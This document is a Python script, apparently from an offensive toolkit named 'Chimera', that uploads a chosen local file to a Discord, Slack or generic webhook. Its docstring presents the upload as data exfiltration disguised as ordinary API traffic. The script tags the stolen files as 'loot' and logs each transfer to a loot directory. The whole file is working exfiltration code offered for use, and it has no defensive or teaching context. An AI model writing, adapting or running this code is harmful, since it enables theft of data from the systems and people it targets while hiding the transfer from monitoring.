import sys
import requests
import os
import json

def exfiltrate_via_webhook(webhook_url, file_path, platform="generic"):
    """
    Weaponized Webhook: Disguises data exfiltration as legitimate 
    API traffic to Discord, Slack, or Teams.
    """
    if not os.path.exists(file_path):
        print(f"[-] File not found: {file_path}")
        return

    file_name = os.path.basename(file_path)
    file_size = os.path.getsize(file_path)
    
    print(f"[*] Preparing exfiltration for: {file_name} ({file_size} bytes)")
    print(f"[*] Targeting Platform: {platform.upper()}")

    try:
        with open(file_path, 'rb') as f:
            if platform.lower() == "discord":
                # Discord handles files via multipart/form-data
                payload = {"content": f"Chimera Loot Recovered: {file_name}"}
                files = {"file": (file_name, f)}
                r = requests.post(webhook_url, data=payload, files=files, timeout=15)
            
            elif platform.lower() == "slack":
                # Slack requires a specific 'token' or 'file.upload' logic usually, 
                # but simple webhooks can take snippet-style JSON.
                # For high-fidelity, we use the multipart approach.
                payload = {"initial_comment": f"Chimera Asset: {file_name}", "channels": "C12345"}
                files = {"file": (file_name, f)}
                r = requests.post(webhook_url, data=payload, files=files, timeout=15)

            else:
                # Generic HTTP POST for custom listeners
                files = {"file": (file_name, f)}
                r = requests.post(webhook_url, files=files, timeout=15)

        if r.status_code in [200, 201, 204]:
            print(f"[!] SUCCESS: Data exfiltrated to {platform} webhook.")
        else:
            print(f"[-] Transfer Failed. Status Code: {r.status_code}")
            print(f"[-] Response: {r.text}")

        # Log for audit
        with open("../loot/webhook_history.log", "a") as log:
            log.write(f"Platform: {platform} | File: {file_name} | Status: {r.status_code}\n")

    except Exception as e:
        print(f"[-] Webhook Fault: {e}")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: 138_webhook <url> <file_path> [platform: discord|slack|generic]")
        sys.exit(1)
    
    plat = sys.argv[3] if len(sys.argv) > 3 else "generic"
    exfiltrate_via_webhook(sys.argv[1], sys.argv[2], plat)
